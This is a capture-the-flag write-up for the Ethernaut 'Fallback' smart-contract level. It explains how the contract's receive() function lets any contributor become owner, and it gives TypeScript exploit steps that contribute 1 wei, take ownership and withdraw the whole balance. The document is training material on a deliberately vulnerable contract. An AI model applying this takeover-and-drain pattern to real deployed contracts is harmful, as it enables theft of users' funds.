# Solution for Ethernaut Level 01: Fallback

## Goal

The goal of this level is to claim ownership of the `Fallback` contract and reduce its balance to zero.

## Vulnerability Analysis

The vulnerability lies in the contract's `receive()` function.

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

In Solidity, the `receive()` function is executed when a contract is sent Ether without any accompanying call data. In this contract, the `receive()` function has a critical flaw: it changes the contract's `owner` to `msg.sender` if two conditions are met:

1.  The amount of Ether sent (`msg.value`) is greater than zero.
2.  The sender (`msg.sender`) has a contribution amount greater than zero in the `contributions` mapping.

An attacker can exploit this to hijack the contract's ownership.

## The Exploit

The solution involves a three-step process, as implemented in the `exploit.ts` script:

### Step 1: Become a Contributor

First, we need to satisfy the `contributions[msg.sender] > 0` condition. We can do this by calling the `contribute()` function with a very small amount of Ether.

```typescript
// 1. Become a contributor
console.log("Contributing...");
await (
  await fallback.contribute({
    value: ethers.parseUnits("1", "wei"),
  })
).wait();
console.log("Contribution successful. Player is now a contributor.");
```

This transaction ensures our address is recorded in the `contributions` mapping.

### Step 2: Trigger the `receive()` Function to Take Ownership

Next, we send a transaction with a small amount of Ether directly to the contract's address. Since this transaction has no call data, it automatically triggers the `receive()` function.

```typescript
// 2. Take ownership by sending a transaction to the contract's fallback function
console.log("Sending transaction to trigger fallback and take ownership...");
await (
  await player.sendTransaction({
    to: await fallback.getAddress(),
    value: ethers.parseUnits("1", "wei"),
  })
).wait();
console.log("New owner:", await fallback.owner());
```

Because we are now a contributor and are sending Ether (`msg.value > 0`), the conditions in the `receive()` function are met. The line `owner = msg.sender;` is executed, and we become the new owner of the contract.

### Step 3: Withdraw the Contract's Funds

Now, as the new owner, we have the authority to call the `withdraw()` function, which transfers the entire balance of the contract to our address.

```typescript
// 3. Withdraw all funds
console.log("Withdrawing funds...");
await (await fallback.withdraw()).wait();
console.log("Withdrawal successful.");
```

After this final step, we have successfully taken ownership and drained the contract of all its funds, completing the level's objective.
